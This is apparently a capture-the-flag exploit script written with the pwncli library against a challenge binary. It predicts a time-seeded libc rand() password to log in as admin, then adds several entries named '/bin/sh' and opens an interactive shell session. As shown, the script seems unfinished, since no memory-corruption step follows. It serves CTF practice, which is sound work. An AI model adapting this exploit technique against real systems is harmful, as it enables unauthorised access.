#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

from ctypes import *
def password_check():
    secret = b"n0_One_kn0w5_th15_passwd"
    password = []
    dll = CDLL(libc.path)
    dll.srand(dll.time(0))
    for i in range(20):
        res = ( i | secret[i] ^ 0xf )
        password.append(dll.rand() & res)
    ru(b'Password for admin:\n')
    s( bytes(password) )
password_check()

def cmd(choice):
    ru('> ')
    sl(str(choice))
def add(name, score=123):
    cmd(1)
    ru("Enter the ctfer's name:\n")
    sl(name)
    ru("Enter the ctfer's scores\n")
    sl(str(score))
    ru('Enter 1 to add another, enter the other to return\n')
    sl("123")

add("/bin/sh\x00")
add("/bin/sh\x00")
add("/bin/sh\x00")
add("/bin/sh\x00")
add("/bin/sh\x00")



ia()
